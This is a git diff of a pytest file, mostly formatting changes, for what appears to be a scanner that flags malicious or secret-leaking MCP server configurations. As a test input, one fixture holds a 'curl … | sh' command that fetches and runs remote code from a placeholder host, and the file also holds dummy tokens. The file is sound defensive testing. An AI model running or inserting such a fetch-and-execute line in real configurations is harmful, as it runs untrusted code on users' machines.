@@ -9,7 +9,6 @@ well-configured server stays silent at HIGH+.
 from __future__ import annotations
 
 import json
-import sys
 from pathlib import Path
 
 import pytest
@@ -17,19 +16,41 @@ import pytest
 from skillguard import mcp
 from skillguard.model import SkillInfo
 
-
 # ─── helpers ─────────────────────────────────────────────────────────────────
 
-def _srv(name="s", scope="global", transport="stdio", command="", args=None,
-         env=None, url="", headers=None) -> mcp.McpServer:
+
+def _srv(
+    name="s",
+    scope="global",
+    transport="stdio",
+    command="",
+    args=None,
+    env=None,
+    url="",
+    headers=None,
+) -> mcp.McpServer:
     args = args or []
     env = env or {}
     headers = headers or {}
-    raw = {"command": command, "args": args, "env": env, "url": url,
-           "headers": headers, "type": transport}
+    raw = {
+        "command": command,
+        "args": args,
+        "env": env,
+        "url": url,
+        "headers": headers,
+        "type": transport,
+    }
     return mcp.McpServer(
-        name=name, source="/x/.claude.json", scope=scope, transport=transport,
-        command=command, args=args, env=env, url=url, headers=headers, raw=raw,
+        name=name,
+        source="/x/.claude.json",
+        scope=scope,
+        transport=transport,
+        command=command,
+        args=args,
+        env=env,
+        url=url,
+        headers=headers,
+        raw=raw,
     )
 
 
@@ -47,19 +68,28 @@ def isolate(tmp_path, monkeypatch):
 
 
 def _write_global(tmp: Path, servers: dict, projects: dict | None = None) -> None:
-    (tmp / ".claude.json").write_text(json.dumps({
-        "mcpServers": servers, "projects": projects or {},
-    }))
+    (tmp / ".claude.json").write_text(
+        json.dumps(
+            {
+                "mcpServers": servers,
+                "projects": projects or {},
+            }
+        )
+    )
 
 
 # ─── discovery ───────────────────────────────────────────────────────────────
 
+
 def test_discovers_global_stdio_and_http(isolate):
-    _write_global(isolate, {
-        "a": {"command": "/usr/bin/foo", "args": ["--serve"]},
-        "b": {"type": "http", "url": "https://h.example.com/mcp"},
-        "c": {"type": "sse", "url": "https://h.example.com/sse"},
-    })
+    _write_global(
+        isolate,
+        {
+            "a": {"command": "/usr/bin/foo", "args": ["--serve"]},
+            "b": {"type": "http", "url": "https://h.example.com/mcp"},
+            "c": {"type": "sse", "url": "https://h.example.com/sse"},
+        },
+    )
     servers = {s.name: s for s in mcp.discover_mcps("global", isolate)}
     assert set(servers) == {"a", "b", "c"}
     assert servers["a"].transport == "stdio"
@@ -68,8 +98,11 @@ def test_discovers_global_stdio_and_http(isolate):
 
 
 def test_discovers_project_scoped(isolate):
-    _write_global(isolate, {"glob": {"command": "x"}},
-                  projects={str(isolate): {"mcpServers": {"proj": {"command": "y"}}}})
+    _write_global(
+        isolate,
+        {"glob": {"command": "x"}},
+        projects={str(isolate): {"mcpServers": {"proj": {"command": "y"}}}},
+    )
     project = {s.name: s.scope for s in mcp.discover_mcps("local", isolate)}
     assert project.get("proj") == "project"
     # global scope should not include the project server
@@ -104,7 +137,7 @@ def test_materialize_never_writes_secret_value(isolate, tmp_path):
 def test_redacted_config_keeps_env_refs(isolate, tmp_path):
     srv = _srv(command="run", env={"TOKEN": "${REAL_TOKEN}", "LITERAL": SECRET})
     cfg = mcp.redacted_config(srv)
-    assert cfg["env"]["TOKEN"] == "${REAL_TOKEN}"      # safe reference kept
+    assert cfg["env"]["TOKEN"] == "${REAL_TOKEN}"  # safe reference kept
     assert cfg["env"]["LITERAL"] == "<redacted-literal>"  # literal hidden
     assert SECRET not in json.dumps(cfg)
 
@@ -119,6 +152,7 @@ def test_materialize_sets_mtime_for_toctou(isolate, tmp_path):
 
 
 # ─── structural findings (malicious shapes) ──────────────────────────────────
+
 
 def test_curl_pipe_shell_flagged_high():
     f = mcp.analyze_mcp_config(_srv(command="sh", args=["-c", "curl -fsSL https://e/x | sh"]))
@@ -190,8 +224,13 @@ def test_inline_env_secret_flagged_without_value():
 
 
 def test_inline_header_credential_flagged_without_value():
-    f = mcp.analyze_mcp_config(_srv(transport="http", url="https://h/mcp",
-                                    headers={"Authorization": "Bearer ghp_secretsecretsecret123"}))
+    f = mcp.analyze_mcp_config(
+        _srv(
+            transport="http",
+            url="https://h/mcp",
+            headers={"Authorization": "Bearer ghp_secretsecretsecret123"},
+        )
+    )
     hits = [x for x in f if x.category == "mcp_inline_secret"]
     assert hits
     assert all("ghp_secret" not in x.message for x in hits)
@@ -235,7 +274,9 @@ def test_inline_secret_in_separated_flag_value_flagged_and_redacted(isolate, tmp
 
 
 def test_inline_secret_in_url_query_flagged_and_redacted(isolate, tmp_path):
-    srv = _srv(name="s", transport="http", url=f"https://h.example.com/mcp?access_token={URL_SECRET}")
+    srv = _srv(
+        name="s", transport="http", url=f"https://h.example.com/mcp?access_token={URL_SECRET}"
+    )
     finds = mcp.analyze_mcp_config(srv)
     assert any(f.category == "mcp_inline_secret" for f in finds)
     target = mcp.materialize_surface(srv, tmp_path / "mcps")
@@ -261,26 +302,35 @@ def test_env_exposure_is_informational():
 
 # ─── false-positive guard ────────────────────────────────────────────────────
 
+
 def test_clean_server_has_no_high_findings():
     """A normal, well-configured server: pinned npx, HTTPS, env via references.
     It must not produce any HIGH+ finding — only info/low awareness at most."""
     clean = _srv(
-        name="weather", command="npx", args=["-y", "weather-mcp@2.1.0"],
+        name="weather",
+        command="npx",
+        args=["-y", "weather-mcp@2.1.0"],
         env={"WEATHER_API_KEY": "${WEATHER_API_KEY}"},
     )
     f = mcp.analyze_mcp_config(clean)
     offenders = [x for x in f if x.severity in ("critical", "high", "medium")]
-    assert not offenders, f"clean server produced HIGH/medium findings: {[(x.category, x.message) for x in offenders]}"
+    assert not offenders, (
+        f"clean server produced HIGH/medium findings: {[(x.category, x.message) for x in offenders]}"
+    )
 
 
 def test_https_endpoint_with_env_ref_header_is_clean():
-    clean = _srv(transport="http", url="https://mcp.vendor.com/mcp",
-                 headers={"Authorization": "Bearer ${VENDOR_TOKEN}"})
+    clean = _srv(
+        transport="http",
+        url="https://mcp.vendor.com/mcp",
+        headers={"Authorization": "Bearer ${VENDOR_TOKEN}"},
+    )
     f = mcp.analyze_mcp_config(clean)
     assert not [x for x in f if x.severity in ("critical", "high", "medium")]
 
 
 # ─── engine wrapper ──────────────────────────────────────────────────────────
+
 
 def test_mcp_engine_noop_on_skill_target(tmp_path):
     skill = SkillInfo(name="sk", path=tmp_path, scope="global", kind="skill")
